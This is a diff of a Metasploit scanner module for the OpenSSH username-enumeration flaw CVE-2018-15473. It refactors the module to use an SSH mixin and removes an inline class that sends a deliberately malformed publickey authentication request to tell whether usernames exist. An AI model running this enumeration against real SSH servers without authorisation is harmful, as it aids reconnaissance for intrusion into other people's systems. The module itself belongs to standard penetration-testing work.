@@ -3,13 +3,10 @@
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-require 'net/ssh'
-
 class MetasploitModule < Msf::Auxiliary
+  include Msf::Exploit::Remote::SSH
   include Msf::Auxiliary::Scanner
   include Msf::Auxiliary::Report
-  include Msf::Auxiliary::CommandShell
-  include Msf::Exploit::Remote::SSH
 
   def initialize(info = {})
     super(update_info(info,
@@ -41,7 +38,7 @@ class MetasploitModule < Msf::Auxiliary
         ['CVE', '2018-15473'],
         ['OSVDB', '32721'],
         ['BID', '20418'],
-        ['URL', 'http://seclists.org/oss-sec/2018/q3/124'],
+        ['URL', 'https://seclists.org/oss-sec/2018/q3/124'],
         ['URL', 'https://sekurak.pl/openssh-users-enumeration-cve-2018-15473/']
       ],
       'License'        => MSF_LICENSE,
@@ -121,7 +118,7 @@ class MetasploitModule < Msf::Auxiliary
     }
 
     # The auth method is converted into a class name for instantiation,
-    # so malformed-packet here becomes MalformedPacket defined below
+    # so malformed-packet here becomes MalformedPacket from the mixin
     case technique
     when :malformed_packet
       opts.merge!(:auth_methods => ['malformed-packet'])
@@ -256,51 +253,5 @@ class MetasploitModule < Msf::Auxiliary
 
     print_status("#{peer(ip)} Starting scan")
     users.each { |user| show_result(attempt_user(user, ip), user, ip) }
-  end
-end
-
-#
-# Define malformed-packet auth method for Net::SSH.start
-#
-# XXX: This is ghetto af (see lib/msf/core/exploit/fortinet.rb)
-#
-# https://tools.ietf.org/rfc/rfc4252.txt
-# https://tools.ietf.org/rfc/rfc4253.txt
-#
-class Net::SSH::Authentication::Methods::MalformedPacket < Net::SSH::Authentication::Methods::Abstract
-  def authenticate(service_name, username, password = nil)
-    debug { 'Sending SSH_MSG_USERAUTH_REQUEST (publickey)' }
-
-    # Corrupt everything after auth method
-    send_message(userauth_request(
-=begin
-      string    user name in ISO-10646 UTF-8 encoding [RFC3629]
-      string    service name in US-ASCII
-      string    "publickey"
-      boolean   FALSE
-      string    public key algorithm name
-      string    public key blob
-=end
-      username,
-      service_name,
-      'publickey',
-      Rex::Text.rand_text_english(8..42)
-    ))
-
-    # SSH_MSG_DISCONNECT is queued
-    begin
-      message = session.next_message
-    rescue Net::SSH::Disconnect
-      debug { 'Received SSH_MSG_DISCONNECT' }
-      return true
-    end
-
-    if message && message.type == USERAUTH_FAILURE
-      debug { 'Received SSH_MSG_USERAUTH_FAILURE' }
-      return false
-    end
-
-    # We'll probably never hit this
-    false
   end
 end
